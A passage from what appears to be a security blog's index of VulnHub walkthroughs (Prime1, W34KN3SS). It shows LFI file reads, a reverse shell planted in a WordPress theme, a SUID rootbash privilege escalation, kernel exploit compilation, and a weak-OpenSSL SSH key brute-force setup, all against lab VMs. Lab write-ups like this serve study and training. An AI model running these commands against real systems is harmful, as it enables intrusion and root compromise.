75]/boot/grub/grub.cfg [Status: 200, Size: 8897, Words: 894, Lines: 266]/etc/cups/cupsd.conf [Status: 200, Size: 4827, Words: 574, Lines: 147]/etc/default/grub [Status: 200, Size: 1497, Words: 157, Lines: 41]/etc/dhcp/dhclient.conf [Status: 200, Size: 1932, Words: 180, Lines: 61]/etc/debconf.conf [Status: 200, Size: 3166, Words: 423, Lines: 90]/etc/fstab [Status: 200, Size: 866, Words: 172, Lines: 19]/etc/fuse.conf [Status: 200, Size: 477, Words: 50, Lines: 15]/etc/crontab [Status: 200, Size: 945, Words: 116, Lines: 23]/etc/host.conf [Status: 200, Size: 289, Words: 28, Lines: 10]/etc/deluser.conf [Status: 200, Size: 801, Words: 98, Lines: 27]/etc/hdparm.conf [Status: 200, Size: 4978, Words: 746, Lines: 143]/etc/ca-certificates.conf [Status: 200, Size: 7985, Words: 76, Lines: 191]/etc/hosts.allow [Status: 200, Size: 608, Words: 94, Lines: 17]/etc/hosts.deny [Status: 200, Size: 908, Words: 140, Lines: 24]/etc/ld.so.conf [Status: 200, Size: 231, Words: 14, Lines: 9]/etc/init.d/apache2 [Status: 200, Size: 8284, Words: 1479, Lines: 357]/etc/logrotate.conf [Status: 200, Size: 900, Words: 131, Lines: 43]/etc/kernel-img.conf [Status: 200, Size: 307, Words: 25, Lines: 11]/etc/kbd/config [Status: 200, Size: 3263, Words: 456, Lines: 83]/etc/hosts [Status: 200, Size: 418, Words: 32, Lines: 16]/etc/ldap/ldap.conf [Status: 200, Size: 529, Words: 35, Lines: 24]/etc/login.defs [Status: 200, Size: 10748, Words: 1650, Lines: 348]/etc/issue.net [Status: 200, Size: 216, Words: 15, Lines: 8]/etc/issue [Status: 200, Size: 223, Words: 17, Lines: 9]/etc/modules [Status: 200, Size: 392, Words: 45, Lines: 12]/etc/manpath.config [Status: 200, Size: 5367, Words: 541, Lines: 138]/etc/lsb-release [Status: 200, Size: 302, Words: 15, Lines: 11]/etc/network/interfaces [Status: 200, Size: 279, Words: 24, Lines: 10]/etc/mtools.conf [Status: 200, Size: 821, Words: 90, Lines: 32]/etc/mtab [Status: 200, Size: 2521, Words: 163, Lines: 37]/etc/ltrace.conf [Status: 200, Size: 15064, Words: 1023, Lines: 550]/etc/mysql/my.cnf [Status: 200, Size: 879, Words: 101, Lines: 28]/etc/pam.conf [Status: 200, Size: 749, Words: 77, Lines: 22]/etc/os-release [Status: 200, Size: 495, Words: 18, Lines: 18]/etc/networks [Status: 200, Size: 288, Words: 23, Lines: 9]/etc/nsswitch.conf [Status: 200, Size: 726, Words: 143, Lines: 27]/etc/profile [Status: 200, Size: 772, Words: 157, Lines: 34]/etc/pulse/client.conf [Status: 200, Size: 1398, Words: 182, Lines: 42]/etc/rpc [Status: 200, Size: 1084, Words: 48, Lines: 47]/etc/resolv.conf [Status: 200, Size: 369, Words: 40, Lines: 10]/etc/security/sepermit.conf [Status: 200, Size: 616, Words: 118, Lines: 18]/etc/security/pam_env.conf [Status: 200, Size: 3169, Words: 441, Lines: 80]/etc/security/namespace.conf [Status: 200, Size: 1637, Words: 231, Lines: 35]/etc/security/limits.conf [Status: 200, Size: 2347, Words: 758, Lines: 63]/etc/security/access.conf [Status: 200, Size: 4817, Words: 703, Lines: 129]/etc/security/time.conf [Status: 200, Size: 2376, Words: 354, Lines: 72]/etc/sensors3.conf [Status: 200, Size: 10565, Words: 2595, Lines: 530]/etc/ssh/ssh_host_dsa_key.pub [Status: 200, Size: 798, Words: 15, Lines: 8]/etc/security/group.conf [Status: 200, Size: 3832, Words: 702, Lines: 113]/etc/ssh/sshd_config [Status: 200, Size: 2739, Words: 254, Lines: 95]/etc/ssh/ssh_config [Status: 200, Size: 1953, Words: 281, Lines: 63]/etc/sysctl.conf [Status: 200, Size: 2281, Words: 243, Lines: 67]/etc/updatedb.conf [Status: 200, Size: 535, Words: 49, Lines: 11]/proc/cpuinfo [Status: 200, Size: 1101, Words: 126, Lines: 34]/proc/cmdline [Status: 200, Size: 367, Words: 21, Lines: 8]/proc/loadavg [Status: 200, Size: 225, Words: 17, Lines: 8]/proc/ioports [Status: 200, Size: 1899, Words: 366, Lines: 71]/proc/meminfo [Status: 200, Size: 1532, Words: 480, Lines: 55]/proc/interrupts [Status: 200, Size: 3649, Words: 1375, Lines: 72]/proc/devices [Status: 200, Size: 776, Words: 115, Lines: 68]/proc/net/dev [Status: 200, Size: 648, Words: 250, Lines: 11]/proc/net/arp [Status: 200, Size: 510, Words: 161, Lines: 11]/proc/net/route [Status: 200, Size: 709, Words: 296, Lines: 11]/proc/partitions [Status: 200, Size: 373, Words: 101, Lines: 14]/proc/net/fib_trie [Status: 200, Size: 1388, Words: 495, Lines: 53]/proc/net/udp [Status: 200, Size: 1093, Words: 244, Lines: 14]/proc/modules [Status: 200, Size: 3692, Words: 343, Lines: 73]/proc/net/tcp [Status: 200, Size: 4697, Words: 1717, Lines: 37]/proc/mounts [Status: 200, Size: 2521, Words: 163, Lines: 37]/proc/self/net/arp [Status: 200, Size: 510, Words: 161, Lines: 11]/proc/self/status [Status: 200, Size: 1501, Words: 109, Lines: 60]/proc/version [Status: 200, Size: 361, Words: 31, Lines: 8]/proc/swaps [Status: 200, Size: 301, Words: 44, Lines: 9]/proc/self/stat [Status: 200, Size: 521, Words: 64, Lines: 8]/proc/stat [Status: 200, Size: 3354, Words: 1499, Lines: 16]/proc/self/mounts [Status: 200, Size: 2521, Words: 163, Lines: 37]/proc/sched_debug [Status: 200, Size: 95623, Words: 46222, Lines: 1748]/usr/share/adduser/adduser.conf [Status: 200, Size: 3225, Words: 414, Lines: 95]/var/log/Xorg.0.log [Status: 200, Size: 21739, Words: 3579, Lines: 312]/var/log/lastlog [Status: 200, Size: 292781, Words: 16, Lines: 7]/var/log/dpkg.log [Status: 200, Size: 334681, Words: 20815, Lines: 4180]:: Progress: [2249/2249] :: Job [1/1] :: 5601 req/sec :: Duration: [0:00:03] :: Errors: 0 :: It is susceptible to LFI View /etc/passwd Find password.txt in my directory Found password victor:follow_the_ippsec Login to wordpress w/ victor:follow_the_ippsec Tried to upload via Replacing 404.php w/ reverse shell Uploading php-reverse-shell.php to plugins All failed After browsing through Pages in Theme Editor, found a writable file Replace secret.php w/ reverse shell Execute reverse shell at http://192.168.1.103/wordpress/wp-content/themes/twentynineteen/secret.php Obtained www-data shell Obtain flag www-data@ubuntu:/home/saket$ cat user.txt af3c658dcf9d7190da3153519c003456 Privilege EscalationSaket - Via Sudo + Creds Found + Cryptography Check for sudo access www-data@ubuntu:/var/www/html$ sudo -l Matching Defaults entries for www-data on ubuntu: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin User www-data may run the following commands on ubuntu: (root) NOPASSWD: /home/saket/enc Check permissions of /home/saket/enc www-data@ubuntu:/var/www/html$ ls -l /home/saket/enc -rwxr-x--x 1 root root 14272 Aug 30 2019 /home/saket/enc www-data@ubuntu:/var/www/html$ cat /home/saket/enc Can only execute it Execute it, see what it does www-data@ubuntu:/home/saket$ sudo ./enc enter password: test www-data@ubuntu:/home/saket$ Tried to do command injection, failed Look for passwords in the Linux file system www-data@ubuntu:/$ find / 2&amp;gt;/dev/null | grep -v /usr/share | grep pass /usr/lib/pppd/2.4.7/passwordfd.so /usr/lib/python3/dist-packages/oauthlib/oauth2/rfc6749/grant_types/__pycache__/resource_owner_password_credentials.cpython-35.pyc /usr/lib/python3/dist-packages/oauthlib/oauth2/rfc6749/grant_types/resource_owner_password_credentials.py /usr/lib/python2.7/getpass.py /usr/lib/apache2/modules/mod_proxy_fdpass.so /usr/lib/gnupg2/gpg-preset-passphrase /usr/lib/python3.5/getpass.py /run/systemd/ask-password /bin/systemd-tty-ask-password-agent /bin/systemd-ask-password /opt/backup/server_database/backup_pass &amp;lt;- BACKUP PASS Found /opt/backup/server_database/backup_pass Linpeas also enumerated /opt/backup/server_database/backup_pass View its content www-data@ubuntu:/$ cat /opt/backup/server_database/backup_pass your password for backup_database file enc is &quot;backup_password&quot; Enjoy! www-data@ubuntu:/$ Execute enc www-data@ubuntu:/home/saket$ sudo /home/saket/enc enter password: backup_password good www-data@ubuntu:/home/saket$ ls -la total 44 drwxr-xr-x 2 root root 4096 Jan 21 10:12 . drwxr-xr-x 4 root root 4096 Aug 29 2019 .. -rw------- 1 root root 20 Aug 31 2019 .bash_history -rwxr-x--x 1 root root 14272 Aug 30 2019 enc -rw-r--r-- 1 root root 237 Jan 21 10:23 enc.txt -rw-r--r-- 1 root root 123 Jan 21 10:23 key.txt -rw-r--r-- 1 root root 18 Aug 29 2019 password.txt -rw-r--r-- 1 root root 33 Aug 31 2019 user.txt www-data@ubuntu:/home/saket$ cat enc.txt nzE+iKr82Kh8BOQg0k/LViTZJup+9DReAsXd/PCtFZP5FHM7WtJ9Nz1NmqMi9G0i7rGIvhK2jRcGnFyWDT9MLoJvY1gZKI2xsUuS3nJ/n3T1Pe//4kKId+B3wfDW/TgqX6Hg/kUj8JO08wGe9JxtOEJ6XJA3cO/cSna9v3YVf/ssHTbXkb+bFgY7WLdHJyvF6lD/wfpY2ZnA1787ajtm+/aWWVMxDOwKuqIT1ZZ0Nw4= www-data@ubuntu:/home/saket$ cat key.txt I know you are the fan of ippsec. So convert string &quot;ippsec&quot; into md5 hash and use it to gain yourself in your real form. enc.txt &amp;amp; key.txt is generated enc.txt is encrypted by base64 Generate md5hash from ippsec www-data@ubuntu:/home/saket$ echo -n ippsec | md5sum 366a74cb3c959de17d61db30591c39d1 Base64 decode enc.txt www-data@ubuntu:/home/saket$ base64 -d enc.txt ?L.�ocX(���K��r�t�=���B�w�w����8*_���E#�����m8Bz\\�7p��Jv��v�,6ב��;X�G&#39;+��P���Xٙ�׿;j;f���YS1 � It does not work We probably have to do something w/ md5sum in order to decrypt enc.txt I had to look for writeups in order to solve this https://www.devglan.com/online-tools/aes-encryption-decryption https://crypto.stackexchange.com/questions/85723/identify-aes-mode Found an AES Online Decryption Tool Base64 decode the output www-data@ubuntu:/home/saket$ echo -n RG9udCB3b3JyeSBzYWtldCBvbmUgZGF5IHdlIHdpbGwgcmVhY2ggdG8Kb3VyIGRlc3RpbmF0aW9uIHZlcnkgc29vbi4gQW5kIGlmIHlvdSBmb3JnZXQgCnlvdXIgdXNlcm5hbWUgdGhlbiB1c2UgeW91ciBvbGQgcGFzc3dvcmQKPT0+ICJ0cmlidXRlX3RvX2lwcHNlYyIKClZpY3Rvciw= | base64 -dDont worry saket one day we will reach toour destination very soon. And if you forget your username then use your old password==&amp;gt; &quot;tribute_to_ippsec&quot;Victor,www-data@ubuntu:/home/saket$ victor:tribute_to_ippsec Switch to user saket saket@ubuntu:~$ su saketPassword: tribute_to_ippsecsaket@ubuntu:~$ Root - Via Sudo Check for sudo access saket@ubuntu:~$ sudo -l Matching Defaults entries for saket on ubuntu: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin User saket may run the following commands on ubuntu: (root) NOPASSWD: /home/victor/undefeated_victor saket@ubuntu:~$ Execute /home/victor/undefeated_victor saket@ubuntu:~$ sudo /home/victor/undefeated_victor if you can defeat me then challenge me in front of you /home/victor/undefeated_victor: 2: /home/victor/undefeated_victor: /tmp/challenge: not found Binary is trying to open/access /tmp/challenge Create /tmp/challenge, that will create rootbash, allowing us to obtain root. printf &#39;#!/bin/bash\\n\\ncp /bin/bash /tmp/rootbash &amp;amp;&amp;amp; chmod u+s /tmp/rootbash\\n&#39; &amp;gt; /tmp/challenge; chmod 4777 /tmp/challenge; Execute /home/victor/undefeated_victor, obtaining root shell saket@ubuntu:~$ sudo /home/victor/undefeated_victor if you can defeat me then challenge me in front of you saket@ubuntu:~$ ls -l /tmp total 1952 -rwsrwxrwx 1 saket saket 67 Jan 21 11:41 challenge drwxrwxrwx 3 www-data www-data 4096 Jan 21 10:10 home -rw-rw-rw- 1 www-data www-data 157929 Jan 21 10:20 linpeas.out -rwxrwxrwx 1 www-data www-data 762836 Dec 31 07:16 linpeas.sh -rw-rw-rw- 1 www-data www-data 174 Jan 21 10:10 myfiles.zip -rwsr-xr-x 1 root root 1037528 Jan 21 11:41 rootbash drwx------ 3 root root 4096 Jan 21 08:53 systemd-private-da7327ba5fda4813bbe7f7867c8991dd-colord.service-BhFB5M drwx------ 3 root root 4096 Jan 21 08:53 systemd-private-da7327ba5fda4813bbe7f7867c8991dd-rtkit-daemon.service-Ag5X2A drwx------ 3 root root 4096 Jan 21 08:53 systemd-private-da7327ba5fda4813bbe7f7867c8991dd-systemd-timesyncd.service-HUin4K drwxrwxrwt 2 root root 4096 Jan 21 08:53 VMwareDnD drwx------ 2 root root 4096 Jan 21 08:53 vmware-root saket@ubuntu:~$ /tmp/rootbash -p rootbash-4.3# whoami root rootbash-4.3# Obtain flag rootbash-4.3# cat root.txt b2b17036da1de94cfb024540a8e7075a rootbash-4.3# Root - Via Kernel Exploit Ran linpeas Search for kernel exploits ┌──(root💀kali)-[~/vulnHub/Prime1/192.168.1.103/exploit/kernel] └─# searchsploit linux 4.10. ----------------------------------------------------------------------------------------------- Exploit Title | Path ----------------------------------------------------------------------------------------------- Linux Kernel&amp;lt;4.13.9(Ubuntu 16.04 / Fedora 27)-Local Privilege Escalation | linux/local/45010.c ----------------------------------------------------------------------------------------------- https://www.exploit-db.com/exploits/45010 Compile Exploit ┌──(root💀kali)-[~/vulnHub/Prime1/192.168.1.103/exploit/kernel] └─# gcc 45010.c -m64 -o exploit -D_GNU_SOURCE Transfer &amp;amp; Exploit " }, { "title": "Vulnhub - W34KN3SS", "url": "/posts/W34KN3SS/", "categories": "Vulnhub, Linux", "tags": "linux-priv-esc/sudo/unknown-exec", "date": "2022-01-28 00:00:00 +0800", "snippet": "ReconNMAP Complete Scan# Nmap 7.92 scan initiated Mon Jan 24 15:55:18 2022 as: nmap -vv --reason -Pn -T4 -sV -sC --version-all -A --osscan-guess -p- -oN /root/vulnHub/W34KN3SS/192.168.236.9/scans/_full_tcp_nmap.txt -oX /root/vulnHub/W34KN3SS/192.168.236.9/scans/xml/_full_tcp_nmap.xml 192.168.236.9mass_dns: warning: Unable to determine any DNS servers. Reverse DNS is disabled. Try using --system-dns or specify valid servers with --dns-serversadjust_timeouts2: packet supposedly had rtt of -530426 microseconds. Ignoring time.Nmap scan report for 192.168.236.9Host is up, received arp-response (0.00052s latency).Scanned at 2022-01-24 15:55:19 +08 for 40sNot shown: 65532 closed tcp ports (reset)PORT STATE SERVICE REASON VERSION22/tcp open ssh syn-ack ttl 64 OpenSSH 7.6p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: | 2048 de:89:a2:de:45:e7:d6:3d:ef:e9:bd:b4:b6:68:ca:6d (RSA)| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCvkgmVahuBlxM6WUy6NSEAmWnYQbfKfrHwxT0rlZleQQ6Hyjd435lLBiA1kSyHzYxQ2l2WhiXefSycEtI8FntMjnOEFahCgobvsP5HblaUGAxmh+RPId+/U0OPwbF8WEtE2aM7ynaJ3eJt02iyHoFSTICNNiwAMX1sde/ADI2zXkssrjerwyTJLrI5JO1girvHJcJxJWvS3HFHyZbksKK6giPy7E8Q6Uz0sp5p+Qx4iqZ9kHkwwLZ+Yk56BupHZDvjDWx9Pi8qhnlwgaqUj/RbG/eEylxRtqQn2i1A6TQrWMcMTpN+P25Ws9TPV8cRiDQwEX+bx30HHgc5AQ+YDRkf| 256 1d:98:4a:db:a2:e0:cc:68:38:93:d0:52:2a:1a:aa:96 (ECDSA)| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBDyK5qz3tcYxvzJVZO2izBdS3LucZE0hUU4mOTja1WHO7Ma3plgqQoL52O+svarU9eHvf0sW5GqD02Bf+4ZQbWo=| 256 3d:8a:6b:92:0d:ba:37:82:9e:c3:27:18:b6:01:cd:98 (ED25519)|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIEOKeds8hqs+e9SnwnrnhhoV8IRh/CUlCgMmdTroLiuG80/tcp open http syn-ack ttl 64 Apache httpd 2.4.29 ((Ubuntu))| http-methods: |_ Supported Methods: OPTIONS HEAD GET POST|_http-title: Apache2 Ubuntu Default Page: It works|_http-server-header: Apache/2.4.29 (Ubuntu)443/tcp open ssl/http syn-ack ttl 64 Apache httpd 2.4.29 ((Ubuntu))|_http-title: 400 Bad Request| http-methods: |_ Supported Methods: GET HEAD POST OPTIONS| ssl-cert: Subject: commonName=weakness.jth/organizationName=weakness.jth/stateOrProvinceName=Jordan/countryName=jo/localityName=Amman/emailAddress=n30@weakness.jth| Issuer: commonName=weakness.jth/organizationName=weakness.jth/stateOrProvinceName=Jordan/countryName=jo/localityName=Amman/emailAddress=n30@weakness.jth| Public Key type: rsa| Public Key bits: 2048| Signature Algorithm: sha256WithRSAEncryption| Not valid before: 2018-05-05T11:12:54| Not valid after: 2019-05-05T11:12:54| MD5: f921 c4be 2c6e 89d6 adaf a7c2 8f39 a87d| SHA-1: 0b44 5a28 c4da 0bf8 b308 a782 4081 1218 101e 0feb| -----BEGIN CERTIFICATE-----| MIID0DCCArigAwIBAgIJAPo2he2sLvFHMA0GCSqGSIb3DQEBCwUAMH0xCzAJBgNV| BAYTAmpvMQ8wDQYDVQQIDAZKb3JkYW4xDjAMBgNVBAcMBUFtbWFuMRUwEwYDVQQK| DAx3ZWFrbmVzcy5qdGgxFTATBgNVBAMMDHdlYWtuZXNzLmp0aDEfMB0GCSqGSIb3| DQEJARYQbjMwQHdlYWtuZXNzLmp0aDAeFw0xODA1MDUxMTEyNTRaFw0xOTA1MDUx| MTEyNTRaMH0xCzAJBgNVBAYTAmpvMQ8wDQYDVQQIDAZKb3JkYW4xDjAMBgNVBAcM| BUFtbWFuMRUwEwYDVQQKDAx3ZWFrbmVzcy5qdGgxFTATBgNVBAMMDHdlYWtuZXNz| Lmp0aDEfMB0GCSqGSIb3DQEJARYQbjMwQHdlYWtuZXNzLmp0aDCCASIwDQYJKoZI| hvcNAQEBBQADggEPADCCAQoCggEBANq345qdUACB07H/jIZ+VTL3029pbwbiB2Ew| 2ZoS0DpiIlz5Fvcd15/Diw/b2uCfXrTa7ka2wYeSP+hpipI6oKTB8+7nRuh+cugv| bApck+17nDe7MeE30s7hO33QPHoCPrWmM6Z53vhF/ur3cyd9osKrAg9oPCXMBBKV| e5/s+gW9c7mfn2u+tHm6nAVKScxVoFdXld0c7OKOZDqFLKK7zLPa5iHKIW9wadYC| c71OAAA5tx5fcn4xVBjOSBQUMOqJMHER1sUMOpqrsyHme84TulgNTck24ndyiHcE| DfkBlOaA+qWDwcxFw22NFkAeg3/ry/J6gTBrQkCRsh3Ncbgd/IsCAwEAAaNTMFEw| HQYDVR0OBBYEFJQs/y0qng9kHtd0p7JuPc/Vq+iWMB8GA1UdIwQYMBaAFJQs/y0q| ng9kHtd0p7JuPc/Vq+iWMA8GA1UdEwEB/wQFMAMBAf8wDQYJKoZIhvcNAQELBQAD| ggEBAMDHIAbnghNdTW/dG9xLyTLkPZYsaAeKgq8B8D5HfNy5Oo7A3dUIit0fvjJv| AFTV16v8dwWPv6mjWwf1Npzl9JNHiT+437ZO+eBn3utIwYa8nl58ZyMC2gZCo0/4| htEK3RgIFnjU2qiBeEBHk+Z6chF4AWVtxJa+mXx4RfUPwK5+WwOUOY9QbymR8cUI| 1qlPDrP3MTuDj8OY9ts17L/XLcyKTkX2zuDIS8wBgt+WoOCb6Hy9s4/PGYwJT5iy| KVlQicmEiKU70In1cpPF1FSV7iLpMQXhspJADJ0lPTzc7WEpIoySpxX8SVQ8cq4b| d07ykwyD+BS8XzcuFQgI/8ek0as=|_-----END CERTIFICATE-----|_ssl-date: TLS randomness does not represent time| tls-alpn: |_ http/1.1|_http-server-header: Apache/2.4.29 (Ubuntu)MAC Address: 08:00:27:AD:E3:6B (Oracle VirtualBox virtual NIC)Device type: general purposeRunning: Linux 3.X|4.XOS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4OS details: Linux 3.2 - 4.9TCP/IP fingerprint:OS:SCAN(V=7.92%E=4%D=1/24%OT=22%CT=1%CU=%PV=Y%DS=1%DC=D%G=N%M=080027%TM=61EOS:E5B8F%P=x86_64-pc-linux-gnu)SEQ(SP=FE%GCD=1%ISR=10F%TI=Z%II=I%TS=A)OPS(OOS:1=M5B4ST11NW7%O2=M5B4ST11NW7%O3=M5B4NNT11NW7%O4=M5B4ST11NW7%O5=M5B4ST11NOS:W7%O6=M5B4ST11)WIN(W1=7120%W2=7120%W3=7120%W4=7120%W5=7120%W6=7120)ECN(ROS:=Y%DF=Y%TG=40%W=7210%O=M5B4NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%TG=40%S=O%A=S+%F=AOS:S%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%TG=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(OS:R=Y%DF=Y%TG=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%TG=40%W=0%S=A%A=OS:Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%TG=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=N)IOS:E(R=Y%DFI=N%TG=40%CD=S)Uptime guess: 16.920 days (since Fri Jan 7 17:51:33 2022)Network Distance: 1 hopTCP Sequence Prediction: Difficulty=254 (Good luck!)IP ID Sequence Generation: All zerosService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelTRACEROUTEHOP RTT ADDRESS1 0.52 ms 192.168.236.9Read data files from: /usr/bin/../share/nmapOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .# Nmap done at Mon Jan 24 15:56:00 2022 -- 1 IP address (1 host up) scanned in 42.27 secondsTCP/80 (HTTP)FFUF┌──(root💀kali)-[~/vulnHub/W34KN3SS]└─# ffuf -u http://192.168.236.9/FUZZ -w /usr/share/wordlists/dirb/common.txt -e &#39;.html,.php,.txt&#39; -fw 22 /&#39;___\\ /&#39;___\\ /&#39;___\\ /\\ \\__/ /\\ \\__/ __ __ /\\ \\__/ \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\ \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/ \\ \\_\\ \\ \\_\\ \\ \\____/ \\ \\_\\ \\/_/ \\/_/ \\/___/ \\/_/ v1.3.1 Kali Exclusive &amp;lt;3________________________________________________ :: Method : GET :: URL : https://192.168.236.9/FUZZ :: Wordlist : FUZZ: /usr/share/wordlists/dirb/common.txt :: Extensions : .html .php .txt :: Follow redirects : false :: Calibration : false :: Timeout : 10 :: Threads : 40 :: Matcher : Response status: 200,204,301,302,307,401,403,405 :: Filter : Response words: 22________________________________________________ [Status: 200, Size: 10918, Words: 3499, Lines: 376]blog [Status: 301, Size: 315, Words: 20, Lines: 10]index.html [Status: 200, Size: 10918, Words: 3499, Lines: 376]index.html [Status: 200, Size: 10918, Words: 3499, Lines: 376]test [Status: 301, Size: 315, Words: 20, Lines: 10]uploads [Status: 301, Size: 318, Words: 20, Lines: 10]upload.php [Status: 200, Size: 216, Words: 13, Lines: 10]:: Progress: [18460/18460] :: Job [1/1] :: 5637 req/sec :: Duration: [0:00:03] :: Errors: 0 :: index.html blog test uploads upload.phpTCP/443 (HTTPS)FFUF Same as TCP/80NMAP Scan:PORT STATE SERVICE REASON VERSION443/tcp open ssl/http syn-ack ttl 64 Apache httpd 2.4.29 ((Ubuntu))| ssl-cert: Subject: commonName=weakness.jth/organizationName=weakness.jth/stateOrProvinceName=Jordan/countryName=jo/localityName=Amman/emailAddress=n30@weakness.jth| Issuer: commonName=weakness.jth/organizationName=weakness.jth/stateOrProvinceName=Jordan/countryName=jo/localityName=Amman/emailAddress=n30@weakness.jth weakness.jth Usually it is localhost.localdomain Initial FootholdTCP/80 (HTTP) - Obtain some credentials Add weakness.jth to /etc/hosts View enumerated directories index.html n30 - Could be a username? blog Does not have HTTP PUT method test uploads Does not have HTTP PUT method upload.php Attempt to upload a file at upload.php Failed to upload Decode Base64 Encoded text ┌──(root💀kali)-[~/vulnHub/W34KN3SS] └─# echo -n V0UgSlVTVCBURVNUIFRISVMgU0NSSVBUV0UgSlVTVCBURVNUIFRISVMgU0NSSVBUIEFHQUlOIDpE | base64 -d WE JUST TEST THIS SCRIPTWE JUST TEST THIS SCRIPT AGAIN :D Run FFUF against http://weakness.jth/FUZZ ┌──(root💀kali)-[~/vulnHub/W34KN3SS] └─# ffuf -u http://weakness.jth/FUZZ -w /usr/share/wordlists/dirb/common.txt -e &#39;.html,.txt,.php&#39; -fw 22 /&#39;___\\ /&#39;___\\ /&#39;___\\ /\\ \\__/ /\\ \\__/ __ __ /\\ \\__/ \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\ \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/ \\ \\_\\ \\ \\_\\ \\ \\____/ \\ \\_\\ \\/_/ \\/_/ \\/___/ \\/_/ v1.3.1 Kali Exclusive &amp;lt;3 ________________________________________________ :: Method : GET :: URL : http://weakness.jth/FUZZ :: Wordlist : FUZZ: /usr/share/wordlists/dirb/common.txt :: Extensions : .html .txt .php :: Follow redirects : false :: Calibration : false :: Timeout : 10 :: Threads : 40 :: Matcher : Response status: 200,204,301,302,307,401,403,405 :: Filter : Response words: 22 ________________________________________________ [Status: 200, Size: 526, Words: 259, Lines: 31] index.html [Status: 200, Size: 526, Words: 259, Lines: 31] index.html [Status: 200, Size: 526, Words: 259, Lines: 31] private [Status: 301, Size: 314, Words: 20, Lines: 10] robots.txt [Status: 200, Size: 14, Words: 4, Lines: 2] :: Progress: [18460/18460] :: Job [1/1] :: 82 req/sec :: Duration: [0:00:04] :: Errors: 0 :: New directories are enumerated private robots.txt View newly enumerated directories robots.txt ┌──(root💀kali)-[~/vulnHub/W34KN3SS] └─# curl http://weakness.jth/robots.txt -s Forget it !! private Running a web app Run FFUF against /private, web app contains many directories which could have senstive information ┌──(root💀kali)-[~/vulnHub/W34KN3SS] └─# ffuf -u http://weakness.jth/private/FUZZ -w /usr/share/wordlists/dirb/common.txt /&#39;___\\ /&#39;___\\ /&#39;___\\ /\\ \\__/ /\\ \\__/ __ __ /\\ \\__/ \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\ \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/ \\ \\_\\ \\ \\_\\ \\ \\____/ \\ \\_\\ \\/_/ \\/_/ \\/___/ \\/_/ v1.3.1 Kali Exclusive &amp;lt;3 ________________________________________________ :: Method : GET :: URL : http://weakness.jth/private/FUZZ :: Wordlist : FUZZ: /usr/share/wordlists/dirb/common.txt :: Follow redirects : false :: Calibration : false :: Timeout : 10 :: Threads : 40 :: Matcher : Response status: 200,204,301,302,307,401,403,405 ________________________________________________ .htaccess [Status: 403, Size: 304, Words: 22, Lines: 12] .htpasswd [Status: 403, Size: 304, Words: 22, Lines: 12] .hta [Status: 403, Size: 299, Words: 22, Lines: 12] assets [Status: 301, Size: 321, Words: 20, Lines: 10] [Status: 200, Size: 989, Words: 75, Lines: 44] files [Status: 301, Size: 320, Words: 20, Lines: 10] index.html [Status: 200, Size: 989, Words: 75, Lines: 44] :: Progress: [4615/4615] :: Job [1/1] :: 62 req/sec :: Duration: [0:00:04] :: Errors: 0 :: New directories are enumerated assets files View enumerated directories assets files Interesting files found TCP/22 (SSH) - openssl 0.9.8c-1 Exploit View mykey.pub ┌──(root💀kali)-[~/vulnHub/W34KN3SS] └─# curl -s http://weakness.jth/private/files/mykey.pub ssh-rsa AAAAB3NzaC1yc2EAAAABIwAAAQEApC39uhie9gZahjiiMo+k8DOqKLujcZMN1bESzSLT8H5jRGj8n1FFqjJw27Nu5JYTI73Szhg/uoeMOfECHNzGj7GtoMqwh38clgVjQ7Qzb47/kguAeWMUcUHrCBz9KsN+7eNTb5cfu0O0QgY+DoLxuwfVufRVNcvaNyo0VS1dAJWgDnskJJRD+46RlkUyVNhwegA0QRj9Salmpssp+z5wq7KBPL1S982QwkdhyvKg3dMy29j/C5sIIqM/mlqilhuidwo1ozjQlU2+yAVo5XrWDo0qVzzxsnTxB5JAfF7ifoDZp2yczZg+ZavtmfItQt1Vac1vSuBPCpTqkjE/4Iklgw== root@targetcluster Target Machine Hostname: targetcluster Private Key Path: /root/.ssh/id_rsa View notes.txt ┌──(root💀kali)-[~/vulnHub/W34KN3SS] └─# curl -s http://weakness.jth/private/files/notes.txt this key was generated by openssl 0.9.8c-1 openssl 0.9.8c-1 Search exploits for openssl 0.9.8c-1 # Exploit Title Path 1 OpenSSL 0.9.8c-1 &amp;lt; 0.9.8g-9 (Debian and Derivatives) - Predictable PRNG Brute Force linux/remote/5622.txt 2 OpenSSL 0.9.8c-1 &amp;lt; 0.9.8g-9 (Debian and Derivatives) - Predictable PRNG Brute Force linux/remote/5632.rb 3 OpenSSL 0.9.8c-1 &amp;lt; 0.9.8g-9 (Debian and Derivatives) - Predictable PRNG Brute Forc linux/remote/5720.py openssl 0.9.8c-1 is exploitable because there are only 65.536 possible ssh keys generated. Use linux/remote/5720.py Follow the instructions in 5720.py Download 5622.tar.bz2 ┌──(root💀kali)-[~/vulnHub/W34KN3SS/192.168.236.9/exploit] └─# wget https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/5622.tar.bz2 -q 